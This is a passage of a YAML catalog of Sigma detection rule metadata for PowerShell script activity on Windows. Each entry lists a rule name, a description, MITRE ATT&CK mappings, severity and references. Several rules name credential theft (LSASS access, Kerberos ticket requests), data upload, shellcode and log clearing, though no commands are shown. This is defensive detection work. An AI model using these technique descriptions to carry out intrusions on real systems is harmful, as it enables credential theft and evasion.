  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_remote_session_creation.yml
  name: PowerShell Remote Session Creation
  description: 'Adversaries may abuse PowerShell commands and scripts for execution.

    PowerShell is a powerful interactive command-line interface and scripting environment
    included in the Windows operating system

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-10---powershell-invoke-downloadcradle
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.4
  false_positives:
  - Legitimate administrative script
  notes: ''
- detection_id: cacef8fc-9d3d-41f7-956d-455c6e881bc5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_remotefxvgpudisablement_abuse.yml
  name: Potential RemoteFXvGPUDisablement.EXE Abuse - PowerShell ScriptBlock
  description: Detects PowerShell module creation where the module Contents are set
    to "function Get-VMRemoteFXPhysicalVideoAdapter". This could be a sign of potential
    abuse of the "RemoteFXvGPUDisablement.exe" binary which is known to be vulnerable
    to module load-order hijacking.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md
  - https://github.com/redcanaryco/AtomicTestHarnesses/blob/7e1e4da116801e3d6fcc6bedb207064577e40572/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1
  false_positives:
  - Unknown
  notes: ''
- detection_id: a861d835-af37-4930-bcd6-5b178bfb54df
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_request_kerberos_ticket.yml
  name: Suspicious Kerberos Ticket Request via PowerShell Script - ScriptBlock
  description: 'Detects PowerShell scripts that utilize native PowerShell Identity
    modules to request Kerberos tickets.

    This behavior is typically seen during a Kerberos or silver ticket attack. A successful
    execution will output the SPNs for the endpoint in question.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1558.003
  tags:
  - attack.credential-access
  - attack.t1558.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1558.003/T1558.003.md#atomic-test-4---request-a-single-ticket-via-powershell
  - https://learn.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8.1
  false_positives:
  - Unknown
  notes: ''
- detection_id: fbc5e92f-3044-4e73-a5c6-1c4359b539de
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_resolve_list_of_ip_from_file.yml
  name: PowerShell Script With File Hostname Resolving Capabilities
  description: Detects PowerShell scripts that have capabilities to read files, loop
    through them and resolve DNS host entries.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1020
  tags:
  - attack.exfiltration
  - attack.t1020
  time_window: ''
  references:
  - https://www.fortypoundhead.com/showcontent.asp?artid=24022
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  false_positives:
  - The same functionality can be implemented by admin scripts, correlate with name
    and creator
  notes: ''
- detection_id: 42821614-9264-4761-acfc-5772c3286f76
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_root_certificate_installed.yml
  name: Root Certificate Installed - PowerShell
  description: Adversaries may install a root certificate on a compromised system
    to avoid warnings when connecting to adversary controlled web servers.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1553.004
  tags:
  - attack.defense-evasion
  - attack.t1553.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md
  false_positives:
  - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need
    to test if GPO push doesn't trigger FP
  notes: ''
- detection_id: 902cedee-0398-4e3a-8183-6f3a89773a96
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_run_from_mount_diskimage.yml
  name: Suspicious Invoke-Item From Mount-DiskImage
  description: Adversaries may abuse container files such as disk image (.iso, .vhd)
    file formats to deliver malicious payloads that may not be tagged with MOTW.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1553.005
  tags:
  - attack.defense-evasion
  - attack.t1553.005
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.005/T1553.005.md#atomic-test-2---mount-an-iso-image-and-run-executable-from-the-iso
  - https://learn.microsoft.com/en-us/powershell/module/storage/mount-diskimage?view=windowsserver2022-ps
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: d2e3f2f6-7e09-4bf2-bc5d-90186809e7fb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_script_with_upload_capabilities.yml
  name: PowerShell Script With File Upload Capabilities
  description: Detects PowerShell scripts leveraging the "Invoke-WebRequest" cmdlet
    to send data via either "PUT" or "POST" method.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1020
  tags:
  - attack.exfiltration
  - attack.t1020
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1020/T1020.md
  - https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.4
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7d416556-6502-45b2-9bad-9d2f05f38997
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_sensitive_file_discovery.yml
  name: Powershell Sensitive File Discovery
  description: Detect adversaries enumerate sensitive files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://twitter.com/malmoeb/status/1570814999370801158
  false_positives:
  - Unknown
  notes: ''
- detection_id: cae80281-ef23-44c5-873b-fd48d2666f49
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_set_acl.yml
  name: PowerShell Script Change Permission Via Set-Acl - PsScript
  description: Detects PowerShell scripts set ACL to of a file or a folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1222
  tags:
  - attack.defense-evasion
  - attack.t1222
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/74438b0237d141ee9c99747976447dc884cb1a39/atomics/T1505.005/T1505.005.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3bf1d859-3a7e-44cb-8809-a99e066d3478
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_set_acl_susp_location.yml
  name: PowerShell Set-Acl On Windows Folder - PsScript
  description: Detects PowerShell scripts to set the ACL to a file in the Windows
    folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1222
  tags:
  - attack.defense-evasion
  - attack.t1222
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/74438b0237d141ee9c99747976447dc884cb1a39/atomics/T1505.005/T1505.005.md
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-acl?view=powershell-5.1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 61d0475c-173f-4844-86f7-f3eebae1c66b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_set_policies_to_unsecure_level.yml
  name: Change PowerShell Policies to an Insecure Level - PowerShell
  description: Detects changing the PowerShell script execution policy to a potentially
    insecure level using the "Set-ExecutionPolicy" cmdlet.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.4
  - https://adsecurity.org/?p=2604
  false_positives:
  - Administrator script
  notes: ''
- detection_id: 16b37b70-6fcf-4814-a092-c36bd3aafcbd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_shellcode_b64.yml
  name: PowerShell ShellCode
  description: Detects Base64 encoded Shellcode
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1055
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://twitter.com/cyb3rops/status/1063072865992523776
  false_positives:
  - Unknown
  notes: ''
- detection_id: 402e1e1d-ad59-47b6-bf80-1ee44985b3a7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_shellintel_malicious_commandlets.yml
  name: Malicious ShellIntel PowerShell Commandlets
  description: Detects Commandlet names from ShellIntel exploitation scripts.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/Shellntel/scripts/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2650dd1a-eb2a-412d-ac36-83f06c4f2282
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_software_discovery.yml
  name: Detected Windows Software Discovery - PowerShell
  description: Adversaries may attempt to enumerate software for a variety of reasons,
    such as figuring out what security measures are present or if the compromised
    system has a version of software that is vulnerable.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1518
  tags:
  - attack.discovery
  - attack.t1518
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1518/T1518.md
  - https://github.com/harleyQu1nn/AggressorScripts
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: a699b30e-d010-46c8-bbd1-ee2e26765fe9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_store_file_in_alternate_data_stream.yml
  name: Powershell Store File In Alternate Data Stream
  description: Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1564.004/T1564.004.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2f77047c-e6e9-4c11-b088-a3de399524cd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_ace_tampering.yml
  name: Potential Persistence Via Security Descriptors - ScriptBlock
  description: Detects usage of certain functions and keywords that are used to manipulate
    security descriptors in order to potentially set a backdoor. As seen used in the
    DAMP project.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://github.com/HarmJ0y/DAMP
  false_positives:
  - Unknown
  notes: ''
- detection_id: 88f0884b-331d-403d-a3a1-b668cf035603
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_ad_group_reco.yml
  name: AD Groups Or Users Enumeration Using PowerShell - ScriptBlock
  description: 'Adversaries may attempt to find domain-level groups and permission
    settings.

    The knowledge of domain-level permission groups can help adversaries determine
    which groups exist and which users belong to a particular group.

    Adversaries may use this information to determine which users have elevated permissions,
    such as domain administrators.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.001
  tags:
  - attack.discovery
  - attack.t1069.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.002/T1069.002.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: e8314f79-564d-4f79-bc13-fbc0bf2660d8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_alias_obfscuation.yml
  name: Potential PowerShell Obfuscation Using Character Join
  description: Detects specific techniques often seen used inside of PowerShell scripts
    to obfscuate Alias creation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - multi_signal_correlation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1027
  - attack.t1059.001
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0f017df3-8f5a-414f-ad6b-24aff1128278
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_clear_eventlog.yml
  name: Suspicious Eventlog Clear
  description: Detects usage of known powershell cmdlets such as "Clear-EventLog"
    to clear the Windows event logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1070.001
  tags:
  - attack.defense-evasion
  - attack.t1070.001
  time_window: ''
  references:
  - https://twitter.com/oroneequalsone/status/1568432028361830402
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.001/T1070.001.md
  - https://eqllib.readthedocs.io/en/latest/analytics/5b223758-07d6-4100-9e11-238cfdd0fe97.html
  - https://stackoverflow.com/questions/66011412/how-to-clear-a-event-log-in-powershell-7
  - https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.eventing.reader.eventlogsession.clearlog?view=windowsdesktop-9.0&viewFallbackFrom=dotnet-plat-ext-5.0#System_Diagnostics_Eventing_Reader_EventLogSession_ClearLog_System_String_
  - https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.eventlog.clear
  false_positives:
  - Rare need to clear logs before doing something. Sometimes used by installers or
    cleaner scripts. The script should be investigated to determine if it's legitimate
  notes: ''
- detection_id: 162e69a7-7981-4344-84a9-0f1c9a217a52
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_directory_enum.yml
  name: Powershell Directory Enumeration
  description: Detects technique used by MAZE ransomware to enumerate directories
    using Powershell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1083/T1083.md
  - https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: 403c2cc0-7f6b-4925-9423-bfa573bed7eb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_download.yml
  name: Suspicious PowerShell Download - Powershell Script
  description: Detects suspicious PowerShell download command
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-8.0
  - https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-8.0
  false_positives:
  - PowerShell scripts that download content from the Internet
  notes: ''
- detection_id: b5522a23-82da-44e5-9c8b-e10ed8955f88
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_execute_batch_script.yml
  name: Powershell Execute Batch Script
  description: 'Adversaries may abuse the Windows command shell for execution.

    The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is
    the primary command prompt on Windows systems.

    The Windows command prompt can be used to control almost any aspect of a system,
    with various permission levels required for different subsets of commands.

    Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential
    commands to run, as well as normal scripting operations such as conditionals and
    loops.

    Common uses of batch files include long or repetitive tasks, or the need to run
    the same set of commands on multiple system

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  tags:
  - attack.execution
  - attack.t1059.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.003/T1059.003.md#atomic-test-1---create-and-execute-batch-script
  false_positives:
  - Legitimate administration script
  notes: ''
- detection_id: bd5971a7-626d-46ab-8176-ed643f694f68
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_extracting.yml
  name: Extracting Information with PowerShell
  description: 'Adversaries may search local file systems and remote file shares for
    files containing insecurely stored credentials.

    These can be files created by users to store their own credentials, shared credential
    stores for a group of individuals,

    configuration files containing passwords for a system or service, or source code/binary
    files containing embedded passwords.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1552.001
  tags:
  - attack.credential-access
  - attack.t1552.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.001/T1552.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 03409c93-a7c7-49ba-9a4c-a00badf2a153
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_follina_execution.yml
  name: Troubleshooting Pack Cmdlet Execution
  description: Detects execution of "TroubleshootingPack" cmdlets to leverage CVE-2022-30190
    or action similar to "msdt" lolbin (as described in LOLBAS)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://twitter.com/nas_bench/status/1537919885031772161
  - https://lolbas-project.github.io/lolbas/Binaries/Msdt/
  false_positives:
  - Legitimate usage of "TroubleshootingPack" cmdlet for troubleshooting purposes
  notes: ''
- detection_id: bbb9495b-58fc-4016-b9df-9a3a1b67ca82
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_get_addefaultdomainpasswordpolicy.yml
  name: Password Policy Discovery With Get-AdDefaultDomainPasswordPolicy
  description: Detetcts PowerShell activity in which Get-Addefaultdomainpasswordpolicy
    is used to get the default password policy for an Active Directory domain.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1201
  tags:
  - attack.discovery
  - attack.t1201
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1201/T1201.md#atomic-test-9---enumerate-active-directory-password-policy-with-get-addefaultdomainpasswordpolicy
  - https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: 4096a49c-7de4-4da0-a230-c66ccd56ea5a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_get_current_user.yml
  name: Suspicious PowerShell Get Current User
  description: Detects the use of PowerShell to identify the current logged user.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1033/T1033.md#atomic-test-4---user-discovery-with-env-vars-powershell-script
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1033/T1033.md#atomic-test-5---getcurrent-user-with-powershell-script
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: eb2fd349-ec67-4caa-9143-d79c7fb34441
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_get_gpo.yml
  name: Suspicious GPO Discovery With Get-GPO
  description: Detect use of Get-GPO to get one GPO or all the GPOs in a domain.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1615
  tags:
  - attack.discovery
  - attack.t1615
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md
  - https://learn.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: af4c87ce-bdda-4215-b998-15220772e993
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_get_process.yml
  name: Suspicious Process Discovery With Get-Process
  description: Get the processes that are running on the local computer.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1057
  tags:
  - attack.discovery
  - attack.t1057
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1057/T1057.md#atomic-test-3---process-discovery---get-process
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.4
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: 84c174ab-d3ef-481f-9c86-a50d0b8e3edb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_getprocess_lsass.yml
  name: PowerShell Get-Process LSASS in ScriptBlock
  description: Detects a Get-Process command on lsass process, which is in almost
    all cases a sign of malicious activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://web.archive.org/web/20220205033028/https://twitter.com/PythonResponder/status/1385064506049630211
  false_positives:
  - Legitimate certificate exports invoked by administrators or users (depends on
    processes in the environment - filter if unusable)
  notes: ''
- detection_id: 8bc063d5-3a3a-4f01-a140-bc15e55e8437
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_gettypefromclsid.yml
  name: Suspicious GetTypeFromCLSID ShellExecute
  description: Detects suspicious Powershell code that execute COM Objects
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.015
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.015
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.015/T1546.015.md#atomic-test-2---powershell-execute-com-object
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: 42d36aa1-3240-4db0-8257-e0118dcdd9cd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_hyper_v_condlet.yml
  name: Suspicious Hyper-V Cmdlets
  description: Adversaries may carry out malicious operations using a virtual instance
    to avoid detection
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
